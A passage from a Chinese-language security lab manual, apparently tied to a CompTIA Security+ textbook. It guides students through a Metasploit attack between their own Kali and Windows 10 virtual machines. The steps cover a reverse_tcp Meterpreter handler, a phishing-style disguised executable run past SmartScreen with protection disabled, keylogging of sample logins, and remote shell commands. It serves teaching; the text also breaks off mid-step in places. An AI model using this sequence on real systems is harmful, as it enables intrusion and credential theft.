

以及文本图形，如图22-1所示。

![](img/6e921d997751f0a0f87e5170ac9657a1_738_0.png)

# 图22-1 欢迎使用Metasploit！

MSFvenom。

d. 在 `msf6 exploit(multi/handler) >` 提示符下，输入

```
set LPORT 14618
```

设置本地端口，用于监听来自受害机器的传入流量。使用我选择的14618。这将14618指定为此漏洞利用模块的本地端口，与使用MSFvenom为载荷配置的端口相匹配。

你将收到以下输出确认：

```
LPORT => 14618
```

e. 在 `msf6 exploit(multi/handler) >` 提示符下，输入

```
show options
```

查看载荷和漏洞利用的相关信息。

f. 在 `msf6 exploit(multi/handler) >` 提示符下，输入

```
exploit
```

开始见证奇迹！

你将看到类似以下的输出（IP地址会换成你自己的）：

```
[*] Started reverse TCP handler on 192.168.1.114:14618
```

![](img/6e921d997751f0a0f87e5170ac9657a1_741_0.png)

# 步骤5 模拟受害者因下载并运行恶意文件而遭受网络钓鱼攻击，该文件将启动你之前创建的漏洞利用。

a. 假设你收到一封电子邮件，称魏斯曼教授的《学习指南》能100%保证你通过CompTIA Security+认证。等等，还有更好的。你只需点击一个链接，就能免费获得它！

在受害机器上打开Firefox（Chrome会阻止你即将下载的文件，甚至不给你覆盖其决定的机会）。在地址栏中输入 http://<你的Kali Linux虚拟机的IP地址>/WeissmanStudyGuide.exe 并按下回车键。

例如，输入以下内容：
**http://192.168.1.114/WeissmanStudyGuide.exe**

请确保文件名的字母大小写与示例一致。

在弹出的对话框中，点击“保存文件”按钮。

+   b. 在“下载”文件夹中，双击 `WeissmanStudyGuide.exe` 启动它。

+   c. 你将看到“Windows已保护你的电脑”窗口，其中显示：“Microsoft Defender SmartScreen已阻止启动无法识别的应用。运行此应用可能会让你的电脑面临风险。”

用户很可能已经多次看到此消息（即使是合法程序），因此他们对它已经变得麻木了。于是，他们放松警惕时甚至不会再多想一下。

不要点击右下角的“不要运行”按钮；而是点击顶部的“更多信息”超链接。

你将看到以下内容：
应用：WeissmanStudyGuide.exe
发布者：未知发布者

点击底部的“仍要运行”按钮。

+   d. 在Kali Linux虚拟机中，你会注意到在 **msf6 exploit(multi/handler)** > exploit 提示符下（显示你的IP地址），你已经成功了，如下所示：

```
[*] Started reverse TCP handler on 192.168.1.114:14618
[*] Sending stage (201283 bytes) to 192.168.1.121
[*] Meterpreter session 1 opened (192.168.1.114:14618 -> 192.168.1.121:49884)
at 2020-08-14 15:56:49 -0400

meterpreter >
```

下一个实验练习正好从这一点开始。如果你此时不继续，则在开始下一个实验练习之前，必须重新建立Meterpreter shell。因此，强烈建议你现在就继续做下一个实验练习。

60分钟

# 实验练习22.03：Metasploit的Meterpreter

是时候使用一种隐蔽、强大且可扩展的载荷——Meterpreter了，它在前一个实验练习的“让我们开始吧”部分以及 https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/ 中已有描述。

# 学习目标

在本实验练习中，你将接着上一个实验练习继续，使用Metasploit的Meterpreter载荷。在本实验练习结束时，你将能够

+   - 对Windows 10系统执行攻击
+   - 理解攻击的各个部分如何与事件响应相关联

# 实验材料和设置

本实验所需的材料有

+   - 《计算机安全原理：CompTIA Security+及超越》教科书
+   你在第1章创建的Windows 10虚拟机
+   你在第1章创建的Kali Linux虚拟机
+   完成上一个实验练习后，机器处于练习结束时的状态

# 让我们开始吧！

如果你不是在紧接着上一个实验练习后继续本实验，请启动Windows 10虚拟机和Kali Linux虚拟机。

如果你的Kali Linux虚拟机现在使用了不同的IP地址，你必须使用MSFvenom生成新的载荷，将其复制到Web服务器的根目录，并从Windows 10虚拟机下载它。你还不如直接重新完成整个上一个实验练习，然后继续这里。

如果你的Kali Linux虚拟机仍然使用与之前相同的IP地址，则无需使用MSFvenom生成新载荷，也无需从Windows 10虚拟机重新下载WeissmanStudyGuide.exe文件（除非它已被删除）。

在Kali Linux虚拟机上，重启Apache Web服务器，启动MSFconsole，并输入上一个实验练习中的以下命令，以返回到Meterpreter shell：

```
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <你的Kali Linux虚拟机的IP地址>
set LPORT 14618
exploit
```

在Windows 10虚拟机上，确保实时保护已关闭（它会自行重新打开，所以如果打开了，再次关闭它），然后双击 `WeissmanStudyGuide.exe` 文件启动它。你应该会再次在Kali Linux虚拟机中看到Meterpreter shell。

现在是时候了解Meterpreter的全部功能了。

1a–1g

# 步骤1 探索Meterpreter命令，以获取信息并在受害机器上执行操作。

+   a. 首先获取受损系统及其驱动器信息：
+       sysinfo

+   b. 要查看自某人使用受损系统键盘以来经过的时间（让你知道是否有人可能立即响应此事件），请输入
+       idletime

+   c. 要查看受损系统上所有正在运行的进程列表，请输入
+       ps

+   d. 在Windows 10虚拟机上打开记事本。在Meterpreter中，输入
+       ps | notepad

CLI窗口，返回Meterpreter shell。

2a–2g

# 步骤2 通过Meterpreter捕获受害机器上的键盘输入。

+   a. 攻击者捕获受害机器上的键盘输入会很有用，其中可能包含用户名/密码组合以及使用这些凭据的网站。键盘记录还可以捕获在文档或电子邮件中输入（即使是最后时刻被丢弃且未保存或发送的文件或电子邮件）的敏感信息。其他URL以及程序或文件的名称也可能被捕获并用于恶意目的。
+   
+   在Meterpreter shell中，输入
+   keyscan_start
+   启动键盘嗅探器。

+   b. 在Windows 10虚拟机上，打开记事本，开始输入几段任意内容。务必使用箭头键、BACKSPACE和DELETE。

+   c. 在Windows 10虚拟机上，打开任意浏览器并访问 www.chase.com。

# 注意

在整个步骤中，你将无法使用任何用户名/密码组合登录。提供这些信息只是为了演示键盘记录的过程。

在相应的文本框中输入用户名 `bob` 和密码 `bobpassword`，然后点击蓝色的“登录”按钮。

+   d. 访问 https://mycourses.rit.edu。
+   
+   点击“RIT账户登录”按钮，输入用户名 `bob2` 和密码 `bobpassword2`，然后点击“登录”按钮。

+   e. 访问 https://lms.flcc.edu。

```
ipconfig
netstat
route
```

你会注意到 **ifconfig** 和 **ipconfig** 的输出是相同的，而且这些输出看起来与从Windows命令提示符查看时有所不同。然而，从Meterpreter进入Windows命令提示符很简单。

b. 在Meterpreter中，使用以下命令从受损机器打开命令提示符：

```
shell
```

c. 现在你可以像亲自站在受损机器前一样执行网络命令。

使用以下命令查看机器的ARP缓存：

```
arp -a
```

d. 使用以下命令查看机器的网络配置：

```
ipconfig /all
```

e. 使用以下命令查看机器的DNS解析器缓存：

```
ipconfig /displaydns
```

f. 使用以下命令清除机器的DNS解析器缓存：

```
ipconfig /flushdns
```

通过再次执行

```
ipconfig /displaydns
```

验证条目是否已消失。这可能对DNS缓存投毒攻击（在第7章中介绍）有用。

g. 攻击者可以利用受害机器作为攻击机器，因为攻击者现在可以有目的地从受害机器向任何地方发送流量。

如果你没有执行第15章或第16章的实验练习（其中包括在Windows 10虚拟机上安装Wireshark），现在请通过访问 https://www.wireshark.org 安装Wireshark，点击“下载”上方的圆形区域，点击“Windows Installer (64-bit)”，点击“保存文件”按钮，然后在

